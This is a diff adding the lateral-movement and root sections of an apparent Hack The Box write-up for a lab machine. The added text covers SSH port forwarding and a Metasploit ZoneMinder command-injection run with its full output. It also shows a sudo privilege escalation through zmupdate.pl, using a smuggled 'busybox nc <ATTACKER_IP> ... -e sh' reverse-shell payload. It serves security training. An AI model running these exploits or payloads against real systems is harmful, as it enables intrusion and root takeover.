@@ -115,5 +115,137 @@ matthew@surveillance:~$
 ```
 
 # Lateral Movement
+Other than `root` and `matthew`, we have another user with console - `zoneminder`:
 
+```bash
+matthew@surveillance:~$ cat /etc/passwd | grep "/bin/bash"
+root:x:0:0:root:/root:/bin/bash
+matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
+zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
+```
 
+Additionally, we have an open 8080/tcp port which was not discoverable from the outside:
+
+```bash
+matthew@surveillance:~$ (netstat -punta || ss --ntpu) | grep "127.0"
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:52396         127.0.0.53:53           ESTABLISHED -
+```
+
+Lets use Port Forwarding to forward the service running on port 8080 on our target to our attack machine, so we can view it in our browser:
+
+```bash
+ssh -L 3000:127.0.0.1:8080 matthew@10.10.11.245
+```
+
+We found a login page for the ZoneMinder service. According to it's [GitHub page](https://github.com/ZoneMinder/zoneminder#:~:text=ZoneMinder%20is%20an%20integrated%20set,to%20a%20Linux%20based%20machine.):
+> ZoneMinder is an integrated set of applications which provide a complete surveillance solution allowing capture, analysis, recording and monitoring of any CCTV or security cameras attached to a Linux based machine.
+
+![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/d4d3f888-68ac-4d71-9ac9-b1e89a68b78a)
+
+Some research online revealed the [ZoneMinder Snapshots Command Injection](https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/) module on MSFConsole, with which we got a shell as `zoneminder`! 
+
+```bash
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set TARGET 1
+TARGET => 1
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RPORT 3000
+RPORT => 3000
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set TARGETURI /
+TARGETURI => /
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set LHOST tun0
+LHOST => tun0
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Elapsed time: 10.802940403999855 seconds.
+[+] The target is vulnerable.
+[*] Fetching CSRF Token
+[+] Got Token: key:106867928f1efa9fee609babfacd64d9bf03f6fc,1702639348
+[*] Executing Linux (Dropper) for linux/x64/meterpreter/reverse_tcp
+[*] Sending payload
+[*] Sending stage (3045348 bytes) to 10.10.11.245
+[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.11.245:52886) at 2023-12-15 13:22:40 +0200
+[+] Payload sent
+[*] Command Stager progress - 100.00% done (823/823 bytes)
+
+(Meterpreter 1)(/usr/share/zoneminder/www) > shell
+Process 1686 created.
+Channel 1 created.
+id
+uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
+```
+
+After upgrading the shell using `python3 -c "import pty; pty.spawn('/bin/bash')"` and running `sudo -l` we found that this user can run all the Perl files that begin with "zm" in the `/usr/bin` directory.
+
+```bash
+zoneminder@surveillance:/usr/bin$ sudo -l
+sudo -l
+Matching Defaults entries for zoneminder on surveillance:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+```
+
+Looking further into the ZoneMinder repository, we gound the [source code](https://github.com/ZoneMinder/zoneminder/tree/master/scripts) for these files. We found `zmupdate.pl`, which takes unfiltered user input, uses it to create a system command, and executes it.
+
+```perl
+...SNIP...
+$Config{ZM_DB_USER} = $dbUser;
+$Config{ZM_DB_PASS} = $dbPass;
+...SNIP...
+ if ( $response =~ /^[yY]$/ ) {
+      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
+      my $command = 'mysqldump';
+      if ($super) {
+        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
+      } elsif ($dbUser) {
+        $command .= ' -u'.$dbUser;
+        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
+      }
+      if ( defined($portOrSocket) ) {
+        if ( $portOrSocket =~ /^\// ) {
+          $command .= ' -S'.$portOrSocket;
+        } else {
+          $command .= ' -h'.$host.' -P'.$portOrSocket;
+        }
+      } else {
+        $command .= ' -h'.$host; 
+      }
+      my $backup = '@ZM_TMPDIR@/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
+      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
+      print("Creating backup to $backup. This may take several minutes.\n");
+      ($command) = $command =~ /(.*)/; # detaint
+...SNIP...
+```
+
+We can inject a command into the username, which will get execute once the final command is run on the target. Interestingly, there was an attempt to "detaint" the command, however the way it is done has no affect on the command.
+
+```bash
+sudo zmupdate.pl -u "<PAYLOAD>" -p password
+```
+
+We can use the following payload to get a reverse shell as root:
+
+```
+;busybox nc <ATTACKER_IP> <LISTENING_PORT> -e sh;
+```
+
+And finally we got a root shell!
+
+```bash
+┌─[✗]─[dana404@parrot]─[~]
+└──╼ $nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.245] 35926
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
